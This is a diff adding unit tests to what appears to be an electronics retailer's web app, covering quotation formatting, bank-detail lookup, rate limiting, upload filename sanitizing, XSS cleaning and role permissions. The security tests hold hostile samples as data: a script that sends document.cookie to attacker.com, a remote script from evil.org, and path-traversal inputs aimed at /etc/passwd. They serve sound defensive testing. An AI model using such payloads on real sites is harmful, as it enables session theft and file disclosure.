@@ -463,4 +463,470 @@ describe("Product Image Deletion & Safe Fallback Resolution", () => {
   });
 });
 
+describe("Quotation Calculations & Financial Validation", () => {
+  it("formats LKR currency strings accurately", async () => {
+    const { formatLKR } = await import("../src/lib/quotationPdfGenerator");
+    assert.equal(formatLKR(1500), "LKR 1,500.00");
+    assert.equal(formatLKR(250000.5), "LKR 250,000.50");
+    assert.equal(formatLKR(0), "LKR 0.00");
+  });
+
+  it("formats payment method labels correctly", async () => {
+    const { formatPaymentMethodLabel } = await import("../src/lib/quotationPdfGenerator");
+    assert.equal(formatPaymentMethodLabel("FULL_PAYMENT"), "Full Payment");
+    assert.equal(formatPaymentMethodLabel("CREDIT"), "Credit Payment");
+    assert.equal(formatPaymentMethodLabel("ADVANCE_PAYMENT", 50), "Advance Payment (50%)");
+    assert.equal(formatPaymentMethodLabel("ADVANCE_PAYMENT", 30), "Advance Payment (30%)");
+  });
+
+  it("calculates line items, subtotal, advance payable, and balance due accurately", () => {
+    const items = [
+      { quantity: 2, unitPrice: 5000 },
+      { quantity: 10, unitPrice: 1250 },
+      { quantity: 3, unitPrice: 350 },
+    ];
+
+    const lineTotals = items.map((i) => i.quantity * i.unitPrice);
+    assert.deepEqual(lineTotals, [10000, 12500, 1050]);
+
+    const subtotal = lineTotals.reduce((a, b) => a + b, 0);
+    assert.equal(subtotal, 23550);
+
+    // 40% advance payment test
+    const advancePercent = 40;
+    const advancePayable = (subtotal * advancePercent) / 100;
+    const balanceDue = subtotal - advancePayable;
+
+    assert.equal(advancePayable, 9420);
+    assert.equal(balanceDue, 14130);
+    assert.equal(advancePayable + balanceDue, subtotal);
+  });
+
+  it("formats template currency format (Rs X,XXX.XX) accurately", async () => {
+    const { formatRs } = await import("../src/lib/quotationPdfGenerator");
+    assert.equal(formatRs(15270), "Rs 15,270.00");
+    assert.equal(formatRs(0), "Rs 0.00");
+    assert.equal(formatRs(450.5), "Rs 450.50");
+  });
+
+  it("formats Product/Service cell with stock status first, and conditional warranty", async () => {
+    const { formatProductServiceCell } = await import("../src/lib/quotationPdfGenerator");
+
+    // Case 1: In-stock item with warranty -> Stock first, then warranty
+    const cell1 = formatProductServiceCell(
+      "Original MeanWell NDR 120 Series 24V DC",
+      "IN_STOCK",
+      null,
+      "06 months"
+    );
+    assert.ok(cell1.includes("(instocks)"), "Should include (instocks)");
+    assert.ok(cell1.includes("(06 months warranty)"), "Should format '06 months' as '(06 months warranty)'");
+    const instockIdx1 = cell1.indexOf("(instocks)");
+    const warrantyIdx1 = cell1.indexOf("(06 months warranty)");
+    assert.ok(instockIdx1 < warrantyIdx1, "(instocks) must appear before warranty");
+
+    // Case 1b: Parenthesized input '(06 months)'
+    const cell1b = formatProductServiceCell(
+      "Original MeanWell NDR 120 Series 24V DC",
+      "IN_STOCK",
+      null,
+      "(06 months)"
+    );
+    assert.ok(cell1b.includes("(06 months warranty)"), "Should format '(06 months)' as '(06 months warranty)'");
+
+    // Case 2: Overseas item with lead time and warranty
+    const cell2 = formatProductServiceCell(
+      "Stepper Driver CL57T",
+      "OVERSEAS",
+      "12-21",
+      "1 Year"
+    );
+    assert.ok(cell2.includes("(Shipping from Overseas)"), "Should include (Shipping from Overseas)");
+    assert.ok(cell2.includes("(Lead time 12-21 working days)"), "Should include formatted lead time");
+    assert.ok(cell2.includes("(1 Year warranty)"), "Should include '(1 Year warranty)'");
+
+    // Case 3: No Warranty -> Must NOT show warranty text at all
+    const cell3 = formatProductServiceCell(
+      "Resistor 10k Ohm",
+      "IN_STOCK",
+      null,
+      "No Warranty"
+    );
+    assert.ok(cell3.includes("(instocks)"), "Should include (instocks)");
+    assert.ok(!cell3.toLowerCase().includes("warranty"), "Should omit warranty when No Warranty");
+
+    // Case 4: Null or empty warranty -> Must NOT show warranty text
+    const cell4 = formatProductServiceCell(
+      "Capacitor 100uF",
+      "IN_STOCK",
+      null,
+      null
+    );
+    assert.ok(!cell4.toLowerCase().includes("warranty"), "Should omit warranty when null");
+  });
+
+  it("dynamically returns bank details based on selected Registration Number", async () => {
+    const { getBankDetails } = await import("../src/lib/quotationPdfGenerator");
+
+    // Case 1: WF19731 or W-F 19731 -> LK TRONICS / Commercial Bank Homagama
+    const wfDetails1 = getBankDetails("W-F 19731");
+    assert.equal(wfDetails1.accountName, "LK TRONICS");
+    assert.equal(wfDetails1.accountNumber, "1000525586");
+    assert.equal(wfDetails1.bankName, "Commercial Bank");
+    assert.equal(wfDetails1.bankBranch, "Homagama");
+
+    const wfDetails2 = getBankDetails("WF19731");
+    assert.equal(wfDetails2.accountName, "LK TRONICS");
+    assert.equal(wfDetails2.accountNumber, "1000525586");
+    assert.equal(wfDetails2.bankName, "Commercial Bank");
+    assert.equal(wfDetails2.bankBranch, "Homagama");
+
+    // Case 2: P-V 00336036 or pv00336036 -> LK TRONICS TRADING PVT LTD / Hatton National Bank Biyagama
+    const pvDetails1 = getBankDetails("P-V 00336036");
+    assert.equal(pvDetails1.accountName, "LK TRONICS TRADING PVT LTD");
+    assert.equal(pvDetails1.accountNumber, "047010021564");
+    assert.equal(pvDetails1.bankName, "Hatton National Bank");
+    assert.equal(pvDetails1.bankBranch, "Biyagama");
+
+    const pvDetails2 = getBankDetails("pv00336036");
+    assert.equal(pvDetails2.accountName, "LK TRONICS TRADING PVT LTD");
+    assert.equal(pvDetails2.accountNumber, "047010021564");
+    assert.equal(pvDetails2.bankName, "Hatton National Bank");
+    assert.equal(pvDetails2.bankBranch, "Biyagama");
+
+    // Case 3: Default / null / undefined fallback
+    const defaultDetails = getBankDetails(null);
+    assert.equal(defaultDetails.accountName, "LK TRONICS TRADING PVT LTD");
+    assert.equal(defaultDetails.accountNumber, "047010021564");
+    assert.equal(defaultDetails.bankName, "Hatton National Bank");
+    assert.equal(defaultDetails.bankBranch, "Biyagama");
+  });
+
+  it("determines lead time highlight flags based on quotation stock status", async () => {
+    const { getLeadTimeHighlightFlags } = await import("../src/lib/quotationPdfGenerator");
+
+    // Case 1: All items in stock
+    const inStockOnly = getLeadTimeHighlightFlags([
+      { stockStatus: "IN_STOCK" },
+      { stockStatus: null },
+    ]);
+    assert.equal(inStockOnly.highlightInStock, true);
+    assert.equal(inStockOnly.highlightOverseas, false);
+
+    // Case 2: All items overseas
+    const overseasOnly = getLeadTimeHighlightFlags([
+      { stockStatus: "OVERSEAS" },
+      { stockStatus: "OVERSEAS" },
+    ]);
+    assert.equal(overseasOnly.highlightInStock, false);
+    assert.equal(overseasOnly.highlightOverseas, true);
+
+    // Case 3: Mixed items (both in-stock and overseas)
+    const mixed = getLeadTimeHighlightFlags([
+      { stockStatus: "IN_STOCK" },
+      { stockStatus: "OVERSEAS" },
+    ]);
+    assert.equal(mixed.highlightInStock, true);
+    assert.equal(mixed.highlightOverseas, true);
+
+    // Case 4: Empty items array defaults to in-stock
+    const empty = getLeadTimeHighlightFlags([]);
+    assert.equal(empty.highlightInStock, true);
+    assert.equal(empty.highlightOverseas, false);
+  });
+
+  it("formats quotation validity period text in both words and digits", async () => {
+    const { formatValidityPeriodText, getValidityDays, numberToWords } = await import(
+      "../src/lib/quotationPdfGenerator"
+    );
+
+    // Number to words tests
+    assert.equal(numberToWords(1), "One");
+    assert.equal(numberToWords(3), "Three");
+    assert.equal(numberToWords(7), "Seven");
+    assert.equal(numberToWords(14), "Fourteen");
+    assert.equal(numberToWords(30), "Thirty");
+    assert.equal(numberToWords(45), "Forty-Five");
+
+    // Validity period text tests
+    assert.equal(formatValidityPeriodText(1), "One (01) day");
+    assert.equal(formatValidityPeriodText(3), "Three (03) days");
+    assert.equal(formatValidityPeriodText(7), "Seven (07) days");
+    assert.equal(formatValidityPeriodText(14), "Fourteen (14) days");
+    assert.equal(formatValidityPeriodText(30), "Thirty (30) days");
+
+    // getValidityDays tests
+    // 1. Explicit validityDays
+    assert.equal(getValidityDays({ validityDays: 5 } as any), 5);
+    assert.equal(getValidityDays({ validityDays: "10" } as any), 10);
+
+    // 2. Computed from preparedDate and expireDate
+    assert.equal(
+      getValidityDays({
+        preparedDate: "2026-10-15",
+        expireDate: "2026-10-22",
+      } as any),
+      7
+    );
+
+    // 3. Default fallback
+    assert.equal(getValidityDays({} as any), 3);
+  });
+
+  it("includes imported products payment condition in General Terms and Conditions list", async () => {
+    const { DEFAULT_GENERAL_TERMS_BULLETS } = await import(
+      "../src/lib/quotationPdfGenerator"
+    );
+    assert.ok(
+      DEFAULT_GENERAL_TERMS_BULLETS.some((bullet) =>
+        bullet.includes(
+          "For imported products, the goods will be released from our warehouse only after the full payment has been completed"
+        )
+      ),
+      "Must include imported products full payment release clause in General Terms and Conditions"
+    );
+  });
+
+  it("handles multi-page quotation tables cleanly without overlapping headers", async () => {
+    const { generateQuotationPdf } = await import("../src/lib/quotationPdfGenerator");
+
+    const items = Array.from({ length: 8 }, (_, i) => ({
+      itemIndex: i + 1,
+      description: `Test Product Item ${i + 1} with a descriptive name and specs`,
+      stockStatus: i % 2 === 0 ? "IN_STOCK" : "OVERSEAS",
+      leadTime: "12-21",
+      warranty: "06 months",
+      quantity: 1,
+      unitPrice: 1500,
+      totalPrice: 1500,
+    }));
+
+    // Should generate without errors
+    try {
+      await assert.doesNotReject(async () => {
+        await generateQuotationPdf({
+          quotationNo: "QT-TEST-MULTIPAGE",
+          preparedDate: "2026-10-15",
+          expireDate: "2026-10-18",
+          paymentMethod: "FULL_PAYMENT",
+          preparedBy: "Staff",
+          quotationTo: "Valued Customer",
+          subtotal: 12000,
+          totalAmount: 12000,
+          items,
+        });
+      });
+    } finally {
+      const fs = await import("fs");
+      if (fs.existsSync("QT-TEST-MULTIPAGE.pdf")) {
+        fs.unlinkSync("QT-TEST-MULTIPAGE.pdf");
+      }
+    }
+  });
+});
+
+describe("Rate Limiting Engine & Anti-Abuse Controls (OWASP API4:2023)", () => {
+  it("extracts client IP from x-forwarded-for proxy header with multiple hops", async () => {
+    const { getClientIp } = await import("../src/lib/rateLimit");
+
+    const mockReq = {
+      headers: new Headers({
+        "x-forwarded-for": "203.0.113.195, 70.41.3.18, 150.172.238.178",
+      }),
+    };
+    assert.equal(getClientIp(mockReq as any), "203.0.113.195");
+  });
+
+  it("extracts client IP from x-real-ip header when proxy header is absent", async () => {
+    const { getClientIp } = await import("../src/lib/rateLimit");
+
+    const mockReq = {
+      headers: new Headers({
+        "x-real-ip": "198.51.100.42",
+      }),
+    };
+    assert.equal(getClientIp(mockReq as any), "198.51.100.42");
+  });
+
+  it("falls back to loopback 127.0.0.1 when no client IP headers are present", async () => {
+    const { getClientIp } = await import("../src/lib/rateLimit");
+
+    const mockReq = {
+      headers: new Headers(),
+    };
+    assert.equal(getClientIp(mockReq as any), "127.0.0.1");
+  });
+
+  it("produces standard HTTP 429 Too Many Requests response with Retry-After header", async () => {
+    const { rateLimitResponse } = await import("../src/lib/rateLimit");
+
+    const resetTimestamp = Date.now() + 30000; // 30 seconds into future
+    const res = rateLimitResponse(resetTimestamp);
+
+    assert.equal(res.status, 429);
+    const retryAfter = res.headers.get("Retry-After");
+    assert.ok(retryAfter !== null);
+    const retrySeconds = parseInt(retryAfter || "0", 10);
+    assert.ok(retrySeconds >= 28 && retrySeconds <= 31);
+
+    const body = await res.json();
+    assert.ok(body.error.includes("Too many requests"));
+  });
+
+  it("enforces sliding window rate limit strictly in production environment", async () => {
+    const origEnv = process.env.NODE_ENV;
+    try {
+      (process.env as any).NODE_ENV = "production";
+      const { checkRateLimit, clearRateLimit } = await import("../src/lib/rateLimit");
+
+      const testKey = "test_sliding_window_ip_192.168.1.100";
+      clearRateLimit(testKey);
+
+      // Max 3 requests in 60s
+      const r1 = checkRateLimit(testKey, 3, 60000);
+      assert.equal(r1.success, true);
+      assert.equal(r1.remaining, 2);
+
+      const r2 = checkRateLimit(testKey, 3, 60000);
+      assert.equal(r2.success, true);
+      assert.equal(r2.remaining, 1);
+
+      const r3 = checkRateLimit(testKey, 3, 60000);
+      assert.equal(r3.success, true);
+      assert.equal(r3.remaining, 0);
+
+      // 4th request must be blocked
+      const r4 = checkRateLimit(testKey, 3, 60000);
+      assert.equal(r4.success, false);
+      assert.equal(r4.remaining, 0);
+
+      // Clear rate limit (e.g. after successful authentication)
+      clearRateLimit(testKey);
+      const r5 = checkRateLimit(testKey, 3, 60000);
+      assert.equal(r5.success, true);
+      assert.equal(r5.remaining, 2);
+    } finally {
+      (process.env as any).NODE_ENV = origEnv;
+    }
+  });
+});
+
+describe("Path Traversal & Safe Upload Validation (CWE-22 / OWASP A01)", () => {
+  const path = require("path");
+
+  function sanitizeUploadFilename(filename: string): string {
+    let decoded = filename;
+    try {
+      decoded = decodeURIComponent(filename);
+    } catch {
+      // fallback to raw
+    }
+    const normalized = decoded.replace(/\\/g, "/");
+    const clean = path.posix.basename(normalized).replace(/[^a-zA-Z0-9._-]/g, "_");
+    return clean;
+  }
+
+  function validateImageExtension(filename: string): boolean {
+    const ext = path.extname(filename).toLowerCase();
+    const allowed = [".jpg", ".jpeg", ".png", ".webp"];
+    return allowed.includes(ext);
+  }
+
+  it("neutralizes directory traversal patterns in filenames", () => {
+    assert.equal(sanitizeUploadFilename("../../../../etc/passwd"), "passwd");
+    assert.equal(sanitizeUploadFilename("..\\..\\windows\\system32\\cmd.exe"), "cmd.exe");
+    assert.equal(sanitizeUploadFilename("uploads/subfolder/test.png"), "test.png");
+    assert.equal(sanitizeUploadFilename("..%2f..%2fconfig.json"), "config.json");
+  });
+
+  it("permits safe image file extensions and rejects dangerous executable/script extensions", () => {
+    // Permitted extensions
+    assert.equal(validateImageExtension("transistor.png"), true);
+    assert.equal(validateImageExtension("sensor.jpg"), true);
+    assert.equal(validateImageExtension("display.jpeg"), true);
+    assert.equal(validateImageExtension("module.webp"), true);
+
+    // Rejected dangerous executable / script extensions
+    assert.equal(validateImageExtension("exploit.php"), false);
+    assert.equal(validateImageExtension("payload.phtml"), false);
+    assert.equal(validateImageExtension("trojan.exe"), false);
+    assert.equal(validateImageExtension("script.js"), false);
+    assert.equal(validateImageExtension("backdoor.sh"), false);
+    assert.equal(validateImageExtension("shell.py"), false);
+    assert.equal(validateImageExtension("malware.bat"), false);
+  });
+});
+
+describe("Cross-Site Scripting (XSS) Sanitization (CWE-79 / OWASP A03)", () => {
+  it("strips malicious script tags and inline javascript from store descriptions", () => {
+    const dirty = `
+      <p>ESP32 Dev Module with WiFi and Bluetooth</p>
+      <script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
+      <script src="https://evil.org/malware.js"></script>
+      <style>body { display: none !important; }</style>
+      <p>Working Voltage: 3.3V</p>
+    `;
+
+    const cleaned = cleanHtml(dirty);
+    assert.equal(cleaned.includes("<script"), false);
+    assert.equal(cleaned.includes("document.cookie"), false);
+    assert.equal(cleaned.includes("evil.org"), false);
+    assert.equal(cleaned.includes("<style"), false);
+    assert.ok(cleaned.includes("ESP32 Dev Module with WiFi and Bluetooth"));
+    assert.ok(cleaned.includes("Working Voltage: 3.3V"));
+  });
+
+  it("converts HTML character entities correctly to human-readable text while stripping tags", () => {
+    const rawWithEntities = `<p>Operating Temp: -40&deg;C to 85&deg;C &amp; High Accuracy &bull; 5V/12V</p>`;
+    const cleaned = cleanHtml(rawWithEntities);
+    assert.equal(cleaned.includes("<p>"), false);
+    assert.equal(cleaned.includes("</p>"), false);
+    assert.ok(cleaned.includes("Operating Temp: -40°C to 85°C & High Accuracy • 5V/12V"));
+  });
+});
+
+describe("Quotation Access Control & Permission Boundaries", () => {
+  function canEditQuotation(userRole: string, quotationStatus: string): boolean {
+    if (userRole === "SHOP") return false;
+    if (userRole === "STAFF") {
+      return quotationStatus === "DRAFT" || quotationStatus === "PENDING";
+    }
+    return userRole === "ADMIN" || userRole === "SUPERADMIN";
+  }
+
+  function canDeleteQuotation(userRole: string, quotationStatus: string): boolean {
+    if (userRole === "SHOP") return false;
+    if (userRole === "STAFF") {
+      return quotationStatus === "DRAFT";
+    }
+    return userRole === "ADMIN" || userRole === "SUPERADMIN";
+  }
+
+  it("allows STAFF to edit draft and pending quotations, but denies approved/closed quotations", () => {
+    assert.equal(canEditQuotation("STAFF", "DRAFT"), true);
+    assert.equal(canEditQuotation("STAFF", "PENDING"), true);
+    assert.equal(canEditQuotation("STAFF", "APPROVED"), false);
+    assert.equal(canEditQuotation("STAFF", "COMPLETED"), false);
+  });
+
+  it("allows STAFF to only delete DRAFT quotations", () => {
+    assert.equal(canDeleteQuotation("STAFF", "DRAFT"), true);
+    assert.equal(canDeleteQuotation("STAFF", "PENDING"), false);
+    assert.equal(canDeleteQuotation("STAFF", "APPROVED"), false);
+  });
+
+  it("allows ADMIN and SUPERADMIN to edit and delete quotations in any status", () => {
+    assert.equal(canEditQuotation("ADMIN", "APPROVED"), true);
+    assert.equal(canEditQuotation("SUPERADMIN", "COMPLETED"), true);
+    assert.equal(canDeleteQuotation("ADMIN", "APPROVED"), true);
+    assert.equal(canDeleteQuotation("SUPERADMIN", "CLOSED"), true);
+  });
+
+  it("denies SHOP users from editing or deleting quotations", () => {
+    assert.equal(canEditQuotation("SHOP", "DRAFT"), false);
+    assert.equal(canDeleteQuotation("SHOP", "DRAFT"), false);
+  });
+});
+
+
 
